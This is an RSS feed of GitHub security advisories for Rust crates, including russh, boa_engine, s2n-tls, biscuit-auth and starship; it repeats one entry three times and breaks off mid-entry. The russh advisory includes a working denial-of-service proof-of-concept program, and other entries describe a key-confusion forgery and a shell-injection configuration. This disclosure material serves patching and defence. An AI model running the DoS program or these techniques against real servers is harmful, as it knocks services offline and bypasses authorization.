<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/rust.rss</id>
    <title>Security Advisory for Rust crates</title>
    <updated>2024-08-19T15:01:24.929Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Arust"/>
    <subtitle>Security Advisory for Rust crates on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[alloy-json-abi] Stack overflow when parsing specially crafted JSON ABI strings]]></title>
        <id>https://github.com/advisories/GHSA-8327-84cj-8xjm</id>
        <link href="https://github.com/advisories/GHSA-8327-84cj-8xjm"/>
        <updated>2024-08-15T22:10:08.000Z</updated>
        <content type="html"><![CDATA[<p>Affected versions of the <code>alloy-json-abi</code> crate did not properly handle parsing of malformatted JSON ABI strings. The <code>JsonAbi::parse</code> method can be tricked into a stack overflow when processing specially crafted input. </p>
<p>This stack overflow can lead to a crash of the application using this crate, potentially causing a denial of service.</p>
<p>The flaw was corrected in commit <a href="https://github.com/alloy-rs/core/commit/4790c47518024bd391bbd6815b00f501bad76a15">4790c47</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/alloy-rs/core/issues/702">https://github.com/alloy-rs/core/issues/702</a></li>
<li><a href="https://github.com/alloy-rs/core/commit/4790c47518024bd391bbd6815b00f501bad76a15">https://github.com/alloy-rs/core/commit/4790c47518024bd391bbd6815b00f501bad76a15</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2024-0362.html">https://rustsec.org/advisories/RUSTSEC-2024-0362.html</a></li>
<li><a href="https://github.com/advisories/GHSA-8327-84cj-8xjm">https://github.com/advisories/GHSA-8327-84cj-8xjm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8327-84cj-8xjm</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-08-15T22:10:06.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[russh] Russh has an OOM Denial of Service due to allocation of untrusted amount]]></title>
        <id>https://github.com/advisories/GHSA-vgvv-x7xg-6cqg</id>
        <link href="https://github.com/advisories/GHSA-vgvv-x7xg-6cqg"/>
        <updated>2024-08-14T21:18:20.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Allocating an untrusted amount of memory allows any unauthenticated user to OOM a russh server.</p>
<h3 id="details">Details</h3>
<p>An SSH packet consists of a 4-byte big-endian length, followed by a byte stream of this length.
After parsing and potentially decrypting the 4-byte length, russh allocates enough memory for this bytestream, as a performance optimization to avoid reallocations later.</p>
<p><a href="https://github.com/Eugeny/russh/blob/4eaa080e7532662023f75e8fff45b743fe607f8c/russh/src/cipher/mod.rs#L254">https://github.com/Eugeny/russh/blob/4eaa080e7532662023f75e8fff45b743fe607f8c/russh/src/cipher/mod.rs#L254</a></p>
<p>But this length is entirely untrusted and can be set to any value by the client, causing this much memory to be allocated, which will cause the process to OOM within a few such requests.</p>
<p>RFC 4253 contains an explicit section on packet length limits: <a href="https://datatracker.ietf.org/doc/html/rfc4253#section-6.1">https://datatracker.ietf.org/doc/html/rfc4253#section-6.1</a></p>
<blockquote>
<p>However, implementations SHOULD check that the packet length is reasonable in order for the implementation to avoid denial of service and/or buffer overflow attacks.</p>
</blockquote>
<h3 id="poc">PoC</h3>
<p>Running the <code>echoserver</code> example on port 2222 (<code>cd russh &amp;&amp; cargo run --release --example echoserver</code>), the provided Rust program can be executed against this echoserver and will cause it to OOM within a few tries.</p>
<details>
<summary>Rust code to run against the echo server</summary>

<p><code>Cargo.toml</code></p>
<pre><code class="language-toml">[package]
name = "poc"
version = "0.1.0"
edition = "2021"

[dependencies]
hex-literal = "=0.4.1"
</code></pre>
<p><code>main.rs</code></p>
<pre><code class="language-rust">use std::time::Duration;
use std::{error::Error, net::SocketAddr};

use std::{
    io::{Read, Write},
    net::TcpStream,
};

fn main() -&gt; Result&lt;(), Box&lt;dyn Error&gt;&gt; {
    loop {
        attempt()?;
        eprintln!("still running, trying again in a few seconds");
        std::thread::sleep(Duration::from_secs(2));
    }
}

fn attempt() -&gt; Result&lt;(), Box&lt;dyn Error&gt;&gt; {
    for i in 0..5 {
        eprintln!("iteration {i}");
        let mut s = TcpStream::connect("0.0.0.0:2222".parse::&lt;SocketAddr&gt;().unwrap())?;
        s.write_all(b"SSH-2.0-OpenSSH_9.7\r\n")?;
        s.read(&amp;mut [0; 1000])?;
        // A KeyExchangeInit copied from an OpenSSH client run but the length has been replaced with 0xFFFFFF00.
        s.write_all(&amp;hex_literal::hex!(
            "
        ffffff00071401af35150e67f2bc6dc4bc6b5330901900000131736e74727570373631783235353
        1392d736861353132406f70656e7373682e636f6d2c637572766532353531392d7368613235362c
        637572766532353531392d736861323536406c69627373682e6f72672c656364682d736861322d6
        e697374703235362c656364682d736861322d6e697374703338342c656364682d736861322d6e69
        7374703532312c6469666669652d68656c6c6d616e2d67726f75702d65786368616e67652d73686
        13235362c6469666669652d68656c6c6d616e2d67726f757031362d7368613531322c6469666669
        652d68656c6c6d616e2d67726f757031382d7368613531322c6469666669652d68656c6c6d616e2
        d67726f757031342d7368613235362c6578742d696e666f2d632c6b65782d7374726963742d632d
        763030406f70656e7373682e636f6d000001cf7373682d656432353531392d636572742d7630314
        06f70656e7373682e636f6d2c65636473612d736861322d6e697374703235362d636572742d7630
        31406f70656e7373682e636f6d2c65636473612d736861322d6e697374703338342d636572742d7
        63031406f70656e7373682e636f6d2c65636473612d736861322d6e697374703532312d63657274
        2d763031406f70656e7373682e636f6d2c736b2d7373682d656432353531392d636572742d76303
        1406f70656e7373682e636f6d2c736b2d65636473612d736861322d6e697374703235362d636572
        742d763031406f70656e7373682e636f6d2c7273612d736861322d3531322d636572742d7630314
        06f70656e7373682e636f6d2c7273612d736861322d3235362d636572742d763031406f70656e73
        73682e636f6d2c7373682d656432353531392c65636473612d736861322d6e697374703235362c6
        5636473612d736861322d6e697374703338342c65636473612d736861322d6e697374703532312c
        736b2d7373682d65643235353139406f70656e7373682e636f6d2c736b2d65636473612d7368613
        22d6e69737470323536406f70656e7373682e636f6d2c7273612d736861322d3531322c7273612d
        736861322d3235360000006c63686163686132302d706f6c7931333035406f70656e7373682e636
        f6d2c6165733132382d6374722c6165733139322d6374722c6165733235362d6374722c61657331
        32382d67636d406f70656e7373682e636f6d2c6165733235362d67636d406f70656e7373682e636
        f6d0000006c63686163686132302d706f6c7931333035406f70656e7373682e636f6d2c61657331
        32382d6374722c6165733139322d6374722c6165733235362d6374722c6165733132382d67636d4
        06f70656e7373682e636f6d2c6165733235362d67636d406f70656e7373682e636f6d000000d575
        6d61632d36342d65746d406f70656e7373682e636f6d2c756d61632d3132382d65746d406f70656
        e7373682e636f6d2c686d61632d736861322d3235362d65746d406f70656e7373682e636f6d2c68
        6d61632d736861322d3531322d65746d406f70656e7373682e636f6d2c686d61632d736861312d6
        5746d406f70656e7373682e636f6d2c756d61632d3634406f70656e7373682e636f6d2c756d6163
        2d313238406f70656e7373682e636f6d2c686d61632d736861322d3235362c686d61632d7368613
        22d3531322c686d61632d73686131000000d5756d61632d36342d65746d406f70656e7373682e63
        6f6d2c756d61632d3132382d65746d406f70656e7373682e636f6d2c686d61632d736861322d323
        5362d65746d406f70656e7373682e636f6d2c686d61632d736861322d3531322d65746d406f7065
        6e7373682e636f6d2c686d61632d736861312d65746d406f70656e7373682e636f6d2c756d61632
        d3634406f70656e7373682e636f6d2c756d61632d313238406f70656e7373682e636f6d2c686d61
        632d736861322d3235362c686d61632d736861322d3531322c686d61632d736861310000001a6e6
        f6e652c7a6c6962406f70656e7373682e636f6d2c7a6c69620000001a6e6f6e652c7a6c6962406f
        70656e7373682e636f6d2c7a6c69620000000000000000000000000000000000000000
        "
        ))?;

        s.shutdown(std::net::Shutdown::Both)?;
    }
    Ok(())
}
</code></pre>
</details>

<h3 id="impact">Impact</h3>
<p>Due to this allocation, a russh server can be brought to OOM, causing a DoS.
Since this happens before authentication, it can be done by any user that has access to the TCP port over the internet.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Eugeny/russh/security/advisories/GHSA-vgvv-x7xg-6cqg">https://github.com/Eugeny/russh/security/advisories/GHSA-vgvv-x7xg-6cqg</a></li>
<li><a href="https://github.com/Eugeny/russh/commit/f660ea3f64b86d11d19e33076012069f02431e55">https://github.com/Eugeny/russh/commit/f660ea3f64b86d11d19e33076012069f02431e55</a></li>
<li><a href="https://github.com/advisories/GHSA-vgvv-x7xg-6cqg">https://github.com/advisories/GHSA-vgvv-x7xg-6cqg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vgvv-x7xg-6cqg</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-08-14T21:18:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[boa_engine] Boa has an uncaught exception when transitioning the state of `AsyncGenerator` objects]]></title>
        <id>https://github.com/advisories/GHSA-f67q-wr6w-23jq</id>
        <link href="https://github.com/advisories/GHSA-f67q-wr6w-23jq"/>
        <updated>2024-08-15T21:37:58.000Z</updated>
        <content type="html"><![CDATA[<p>A wrong assumption made when handling ECMAScript's <code>AsyncGenerator</code> operations can cause an uncaught exception on certain scripts.</p>
<h2 id="details">Details</h2>
<p>Boa's implementation of <code>AsyncGenerator</code> makes the assumption that the state of an <code>AsyncGenerator</code> object cannot change while resolving a promise created by methods of <code>AsyncGenerator</code> such as <code>%AsyncGeneratorPrototype%.next</code>, <code>%AsyncGeneratorPrototype%.return</code>, or <code>%AsyncGeneratorPrototype%.throw</code>.
However, a carefully constructed code could trigger a state transition from a getter method for the promise's <code>then</code> property, which causes the engine to fail an assertion of this assumption, causing an uncaught exception. This could be used to create a Denial Of Service attack in applications that run arbitrary ECMAScript code provided by an external user.</p>
<h2 id="patches">Patches</h2>
<p>Version 0.19.0 is patched to correctly handle this case.</p>
<h2 id="workarounds">Workarounds</h2>
<p>Users unable to upgrade to the patched version would want to use <a href="https://doc.rust-lang.org/std/panic/fn.catch_unwind.html"><code>std::panic::catch_unwind</code></a> to ensure any exceptions caused by the engine don't impact the availability of the main application.</p>
<h2 id="references">References</h2>
<ul>
<li><a href="https://github.com/boa-dev/boa/commit/69ea2f52ed976934bff588d6b566bae01be313f7">https://github.com/boa-dev/boa/commit/69ea2f52ed976934bff588d6b566bae01be313f7</a></li>
<li><a href="https://github.com/tc39/ecma262/security/advisories/GHSA-g38c-wh3c-5h9r">https://github.com/tc39/ecma262/security/advisories/GHSA-g38c-wh3c-5h9r</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/boa-dev/boa/security/advisories/GHSA-f67q-wr6w-23jq">https://github.com/boa-dev/boa/security/advisories/GHSA-f67q-wr6w-23jq</a></li>
<li><a href="https://github.com/tc39/ecma262/security/advisories/GHSA-g38c-wh3c-5h9r">https://github.com/tc39/ecma262/security/advisories/GHSA-g38c-wh3c-5h9r</a></li>
<li><a href="https://github.com/boa-dev/boa/commit/69ea2f52ed976934bff588d6b566bae01be313f7">https://github.com/boa-dev/boa/commit/69ea2f52ed976934bff588d6b566bae01be313f7</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-43367">https://nvd.nist.gov/vuln/detail/CVE-2024-43367</a></li>
<li><a href="https://github.com/advisories/GHSA-f67q-wr6w-23jq">https://github.com/advisories/GHSA-f67q-wr6w-23jq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f67q-wr6w-23jq</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-08-14T20:49:51.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[s2n-tls] s2n-tls's mTLS API ordering may skip client authentication]]></title>
        <id>https://github.com/advisories/GHSA-857q-xmph-p2v5</id>
        <link href="https://github.com/advisories/GHSA-857q-xmph-p2v5"/>
        <updated>2024-08-09T20:41:39.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>An API ordering issue in s2n-tls can cause client authentication to unexpectedly not be enabled on the server when it otherwise appears to be. Server applications are impacted if client authentication is enabled by calling s2n_connection_set_config() before calling s2n_connection_set_client_auth_type().</p>
<p>Applications are not impacted if these APIs are called in the opposite order, or if client authentication is enabled on the config with s2n_config_set_client_auth_type(). s2n-tls clients verifying server certificates are not impacted.</p>
<p>Impacted versions: &lt; v1.5.0.</p>
<h3 id="patches">Patches</h3>
<p>The patch is included in v1.5.0 [1].</p>
<h3 id="workarounds">Workarounds</h3>
<p>Applications can workaround this issue by calling s2n_connection_set_config() after calling s2n_connection_set_client_auth_type(), or by enabling client authentication on the config with s2n_config_set_client_auth_type().</p>
<p>If you have any questions or comments about this advisory we ask that you contact AWS/Amazon Security via our vulnerability reporting page [2] or directly via email to <a href="mailto:aws-security@amazon.com">aws-security@amazon.com</a>. Please do not create a public GitHub issue.</p>
<p>[1] <a href="https://github.com/aws/s2n-tls/releases/tag/v1.5.0">https://github.com/aws/s2n-tls/releases/tag/v1.5.0</a></p>
<p>[2] <a href="https://aws.amazon.com/security/vulnerability-reporting">https://aws.amazon.com/security/vulnerability-reporting</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/aws/s2n-tls/security/advisories/GHSA-857q-xmph-p2v5">https://github.com/aws/s2n-tls/security/advisories/GHSA-857q-xmph-p2v5</a></li>
<li><a href="https://github.com/aws/s2n-tls/commit/e8ca8911c5b2f2361687dec1467c45cd54d00b3f">https://github.com/aws/s2n-tls/commit/e8ca8911c5b2f2361687dec1467c45cd54d00b3f</a></li>
<li><a href="https://github.com/advisories/GHSA-857q-xmph-p2v5">https://github.com/advisories/GHSA-857q-xmph-p2v5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-857q-xmph-p2v5</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-08-09T20:41:38.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[cosmwasm-vm] Gas mispricing in cosmwasm-vm]]></title>
        <id>https://github.com/advisories/GHSA-rg2q-2jh9-447q</id>
        <link href="https://github.com/advisories/GHSA-rg2q-2jh9-447q"/>
        <updated>2024-08-08T17:03:07.000Z</updated>
        <content type="html"><![CDATA[<p><strong>Component:</strong> wasmvm
<strong>Criticality:</strong> Medium (<a href="https://github.com/interchainio/security/blob/main/resources/CLASSIFICATION_MATRIX.md">ACMv1</a>: I:Moderate; L:Likely)
<strong>Patched versions:</strong> wasmvm 1.5.4, 2.0.3, 2.1.2</p>
<p>Some Wasm operations take significantly more gas than our benchmarks indicated. This can lead to missing the <a href="https://github.com/CosmWasm/cosmwasm/blob/e50490c4199a234200a497219b27f071c3409f58/docs/GAS.md#cosmwasm-gas-pricing">gas target</a> we defined by a factor of ~10x. This means a malicious contract could take 10 times as much time to execute as expected, which can be used to temporarily DoS a chain.</p>
<p>See <a href="https://github.com/CosmWasm/advisories/blob/main/CWAs/CWA-2024-004.md">CWA-2024-004</a> for more details.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/CosmWasm/wasmvm/security/advisories/GHSA-rg2q-2jh9-447q">https://github.com/CosmWasm/wasmvm/security/advisories/GHSA-rg2q-2jh9-447q</a></li>
<li><a href="https://github.com/CosmWasm/cosmwasm/commit/5bef1c588933bd60a04bb70099150cf84b69e144">https://github.com/CosmWasm/cosmwasm/commit/5bef1c588933bd60a04bb70099150cf84b69e144</a></li>
<li><a href="https://github.com/CosmWasm/cosmwasm/commit/9b4d6d03772b75d500a7d3c972d0d8ba6d085c06">https://github.com/CosmWasm/cosmwasm/commit/9b4d6d03772b75d500a7d3c972d0d8ba6d085c06</a></li>
<li><a href="https://github.com/CosmWasm/cosmwasm/commit/c1313afeb261e17b1c8cf6a1eacee1da0dac42ae">https://github.com/CosmWasm/cosmwasm/commit/c1313afeb261e17b1c8cf6a1eacee1da0dac42ae</a></li>
<li><a href="https://github.com/CosmWasm/advisories/blob/main/CWAs/CWA-2024-004.md">https://github.com/CosmWasm/advisories/blob/main/CWAs/CWA-2024-004.md</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2024-0361.html">https://rustsec.org/advisories/RUSTSEC-2024-0361.html</a></li>
<li><a href="https://github.com/advisories/GHSA-rg2q-2jh9-447q">https://github.com/advisories/GHSA-rg2q-2jh9-447q</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rg2q-2jh9-447q</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-08-08T16:30:50.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[cosmwasm-vm] Gas mispricing in cosmwasm-vm]]></title>
        <id>https://github.com/advisories/GHSA-rg2q-2jh9-447q</id>
        <link href="https://github.com/advisories/GHSA-rg2q-2jh9-447q"/>
        <updated>2024-08-08T17:03:07.000Z</updated>
        <content type="html"><![CDATA[<p><strong>Component:</strong> wasmvm
<strong>Criticality:</strong> Medium (<a href="https://github.com/interchainio/security/blob/main/resources/CLASSIFICATION_MATRIX.md">ACMv1</a>: I:Moderate; L:Likely)
<strong>Patched versions:</strong> wasmvm 1.5.4, 2.0.3, 2.1.2</p>
<p>Some Wasm operations take significantly more gas than our benchmarks indicated. This can lead to missing the <a href="https://github.com/CosmWasm/cosmwasm/blob/e50490c4199a234200a497219b27f071c3409f58/docs/GAS.md#cosmwasm-gas-pricing">gas target</a> we defined by a factor of ~10x. This means a malicious contract could take 10 times as much time to execute as expected, which can be used to temporarily DoS a chain.</p>
<p>See <a href="https://github.com/CosmWasm/advisories/blob/main/CWAs/CWA-2024-004.md">CWA-2024-004</a> for more details.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/CosmWasm/wasmvm/security/advisories/GHSA-rg2q-2jh9-447q">https://github.com/CosmWasm/wasmvm/security/advisories/GHSA-rg2q-2jh9-447q</a></li>
<li><a href="https://github.com/CosmWasm/cosmwasm/commit/5bef1c588933bd60a04bb70099150cf84b69e144">https://github.com/CosmWasm/cosmwasm/commit/5bef1c588933bd60a04bb70099150cf84b69e144</a></li>
<li><a href="https://github.com/CosmWasm/cosmwasm/commit/9b4d6d03772b75d500a7d3c972d0d8ba6d085c06">https://github.com/CosmWasm/cosmwasm/commit/9b4d6d03772b75d500a7d3c972d0d8ba6d085c06</a></li>
<li><a href="https://github.com/CosmWasm/cosmwasm/commit/c1313afeb261e17b1c8cf6a1eacee1da0dac42ae">https://github.com/CosmWasm/cosmwasm/commit/c1313afeb261e17b1c8cf6a1eacee1da0dac42ae</a></li>
<li><a href="https://github.com/CosmWasm/advisories/blob/main/CWAs/CWA-2024-004.md">https://github.com/CosmWasm/advisories/blob/main/CWAs/CWA-2024-004.md</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2024-0361.html">https://rustsec.org/advisories/RUSTSEC-2024-0361.html</a></li>
<li><a href="https://github.com/advisories/GHSA-rg2q-2jh9-447q">https://github.com/advisories/GHSA-rg2q-2jh9-447q</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rg2q-2jh9-447q</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-08-08T16:30:50.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[cosmwasm-vm] Gas mispricing in cosmwasm-vm]]></title>
        <id>https://github.com/advisories/GHSA-rg2q-2jh9-447q</id>
        <link href="https://github.com/advisories/GHSA-rg2q-2jh9-447q"/>
        <updated>2024-08-08T17:03:07.000Z</updated>
        <content type="html"><![CDATA[<p><strong>Component:</strong> wasmvm
<strong>Criticality:</strong> Medium (<a href="https://github.com/interchainio/security/blob/main/resources/CLASSIFICATION_MATRIX.md">ACMv1</a>: I:Moderate; L:Likely)
<strong>Patched versions:</strong> wasmvm 1.5.4, 2.0.3, 2.1.2</p>
<p>Some Wasm operations take significantly more gas than our benchmarks indicated. This can lead to missing the <a href="https://github.com/CosmWasm/cosmwasm/blob/e50490c4199a234200a497219b27f071c3409f58/docs/GAS.md#cosmwasm-gas-pricing">gas target</a> we defined by a factor of ~10x. This means a malicious contract could take 10 times as much time to execute as expected, which can be used to temporarily DoS a chain.</p>
<p>See <a href="https://github.com/CosmWasm/advisories/blob/main/CWAs/CWA-2024-004.md">CWA-2024-004</a> for more details.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/CosmWasm/wasmvm/security/advisories/GHSA-rg2q-2jh9-447q">https://github.com/CosmWasm/wasmvm/security/advisories/GHSA-rg2q-2jh9-447q</a></li>
<li><a href="https://github.com/CosmWasm/cosmwasm/commit/5bef1c588933bd60a04bb70099150cf84b69e144">https://github.com/CosmWasm/cosmwasm/commit/5bef1c588933bd60a04bb70099150cf84b69e144</a></li>
<li><a href="https://github.com/CosmWasm/cosmwasm/commit/9b4d6d03772b75d500a7d3c972d0d8ba6d085c06">https://github.com/CosmWasm/cosmwasm/commit/9b4d6d03772b75d500a7d3c972d0d8ba6d085c06</a></li>
<li><a href="https://github.com/CosmWasm/cosmwasm/commit/c1313afeb261e17b1c8cf6a1eacee1da0dac42ae">https://github.com/CosmWasm/cosmwasm/commit/c1313afeb261e17b1c8cf6a1eacee1da0dac42ae</a></li>
<li><a href="https://github.com/CosmWasm/advisories/blob/main/CWAs/CWA-2024-004.md">https://github.com/CosmWasm/advisories/blob/main/CWAs/CWA-2024-004.md</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2024-0361.html">https://rustsec.org/advisories/RUSTSEC-2024-0361.html</a></li>
<li><a href="https://github.com/advisories/GHSA-rg2q-2jh9-447q">https://github.com/advisories/GHSA-rg2q-2jh9-447q</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rg2q-2jh9-447q</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-08-08T16:30:50.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[openssl-src] openssl-src subject to DoS by double-checked locking]]></title>
        <id>https://github.com/advisories/GHSA-vr8j-hgmm-jh9r</id>
        <link href="https://github.com/advisories/GHSA-vr8j-hgmm-jh9r"/>
        <updated>2024-08-02T16:01:27.000Z</updated>
        <content type="html"><![CDATA[<p>If an X.509 certificate contains a malformed policy constraint and policy processing is enabled, then a write lock will be taken twice recursively. On some operating systems (most widely: Windows) this results in a denial of service when the affected process hangs. Policy processing being enabled on a publicly facing server is not considered to be a common setup. Policy processing is enabled by passing the <code>-policy' argument to the command line utilities or by calling either </code>X509_VERIFY_PARAM_add0_policy()' or `X509_VERIFY_PARAM_set1_policies()' functions.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-3996">https://nvd.nist.gov/vuln/detail/CVE-2022-3996</a></li>
<li><a href="https://github.com/openssl/openssl/commit/7725e7bfe6f2ce8146b6552b44e0d226be7638e7">https://github.com/openssl/openssl/commit/7725e7bfe6f2ce8146b6552b44e0d226be7638e7</a></li>
<li><a href="https://www.openssl.org/news/secadv/20221213.txt">https://www.openssl.org/news/secadv/20221213.txt</a></li>
<li><a href="https://github.com/advisories/GHSA-vr8j-hgmm-jh9r">https://github.com/advisories/GHSA-vr8j-hgmm-jh9r</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vr8j-hgmm-jh9r</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-12-13T18:30:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[biscuit-auth] biscuit-auth vulnerable to public key confusion in third party block]]></title>
        <id>https://github.com/advisories/GHSA-p9w4-585h-g3c7</id>
        <link href="https://github.com/advisories/GHSA-p9w4-585h-g3c7"/>
        <updated>2024-08-05T21:14:27.000Z</updated>
        <content type="html"><![CDATA[<p>Third-party blocks can be generated without transferring the whole token to the third-party authority. Instead, a <code>ThirdPartyBlock</code> request can be sent, providing only the necessary info to generate a third-party block and to sign it:</p>
<ul>
<li>the public key of the previous block (used in the signature)</li>
<li>the public keys part of the token symbol table (for public key interning in datalog expressions)</li>
</ul>
<p>A third-part block request forged by a malicious user can trick the third-party authority into generating datalog trusting the wrong keypair.</p>
<p>Consider the following example (nominal case)</p>
<ul>
<li>Authority <code>A</code> emits the following token: <code>check if thirdparty("b") trusting ${pubkeyB}</code></li>
<li>The well-behaving holder then generates a third-party block request based on the token and sends it to third-party authority <code>B</code></li>
<li>Third-party <code>B</code> generates the following third-party block <code>thirdparty("b"); check if thirdparty("c") trusting ${pubkeyC}</code></li>
<li>The token holder now must obtain a third-party block from third party <code>C</code> to be able to use the token</li>
</ul>
<p>Now, with a malicious user:</p>
<ul>
<li>Authority <code>A</code> emits the following token: <code>check if thirdparty("b") trusting ${pubkeyB}</code></li>
<li>The holder then attenuates the token with the following third party block <code>thirdparty("c")</code>, signed with a keypair <code>pubkeyD, privkeyD)</code> they generate</li>
<li>The holder then generates a third-party block request based on this token, but alter the <code>ThirdPartyBlockRequest</code> <code>publicKeys</code> field and replace <code>pubkeyD</code> with <code>pubkeyC</code></li>
<li>Third-party <code>B</code> generates the following third-party block <code>thirdparty("b"); check if thirdparty("c") trusting ${pubkeyC}</code></li>
<li>Due to the altered symbol table, the actual meaning of the block is <code>thirdparty("b"); check if thirdparty("c") trusting ${pubkeyD}</code></li>
<li>The attacker can now use the token without obtaining a third-party block from <code>C</code>.</li>
</ul>
<h3 id="impact">Impact</h3>
<p>Tokens with third-party blocks containing <code>trusted</code> annotations generated through a third party block request</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/biscuit-auth/biscuit-rust/security/advisories/GHSA-p9w4-585h-g3c7">https://github.com/biscuit-auth/biscuit-rust/security/advisories/GHSA-p9w4-585h-g3c7</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-41949">https://nvd.nist.gov/vuln/detail/CVE-2024-41949</a></li>
<li><a href="https://github.com/biscuit-auth/biscuit/security/advisories/GHSA-rgqv-mwc3-c78m">https://github.com/biscuit-auth/biscuit/security/advisories/GHSA-rgqv-mwc3-c78m</a></li>
<li><a href="https://github.com/advisories/GHSA-p9w4-585h-g3c7">https://github.com/advisories/GHSA-p9w4-585h-g3c7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-p9w4-585h-g3c7</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-07-31T21:15:41.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[starship] Starship vulnerable to shell injection via undocumented, unpredictable shell expansion in custom commands]]></title>
        <id>https://github.com/advisories/GHSA-vx24-x4mv-vwr5</id>
        <link href="https://github.com/advisories/GHSA-vx24-x4mv-vwr5"/>
        <updated>2024-07-26T21:48:45.000Z</updated>
        <content type="html"><![CDATA[<h2 id="description">Description</h2>
<p>Starship is a cross-shell prompt. Starting in version 1.0.0 and prior to version 1.20.0, undocumented and unpredictable shell expansion and/or quoting rules make it easily to accidentally cause shell injection when using custom commands with starship in bash. Version 1.20.0 fixes the vulnerability.</p>
<h3 id="poc">PoC</h3>
<p>Have some custom command which prints out information from a potentially untrusted/unverified source.</p>
<pre><code>[custom.git_commit_name]
command = 'git show -s --format="%&lt;(25,mtrunc)%s"'
style = "italic"
when = true
</code></pre>
<h3 id="impact">Impact</h3>
<p>This issue only affects users with custom commands, so the scope is limited, and without knowledge of others' commands, it could be hard to successfully target someone. </p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/starship/starship/security/advisories/GHSA-vx24-x4mv-vwr5">https://github.com/starship/starship/security/advisories/GHSA-vx24-x4mv-vwr5</a></li>
<li><a href="https://github.com/starship/starship/commit/cfc58161e0ec595db90af686ad77a73df6d44d74">https://github.com/starship/starship/commit/cfc58161e0ec595db90af686ad77a73df6d44d74</a></li>
<li><a href="https://github.com/starship/starship/releases/tag/v1.20.0">https://github.com/starship/starship/releases/tag/v1.20.0</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-41815">https://nvd.nist.gov/vuln/detail/CVE-2024-41815</a></li>
<li><a href="https://github.com/advisories/GHSA-vx24-x4mv-vwr5">https://github.com/advisories/GHSA-vx24-x4mv-vwr5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vx24-x4mv-vwr5</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-07-26T21:24:18.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[xmp_toolkit] XMP Toolkit's `XmpFile::close` can trigger undefined behavior]]></title>
        <id>https://github.com/advisories/GHSA-66fw-43h8-f8p3</id>
        <link href="https://github.com/advisories/GHSA-66fw-43h8-f8p3"/>
        <updated>2024-07-26T21:14:55.000Z</updated>
        <content type="html"><![CDATA[<p>Affected versions of the crate failed to catch C++ exceptions raised within the <code>XmpFile::close</code> function. If such an exception occured, it would trigger undefined behavior, typically a process abort.</p>
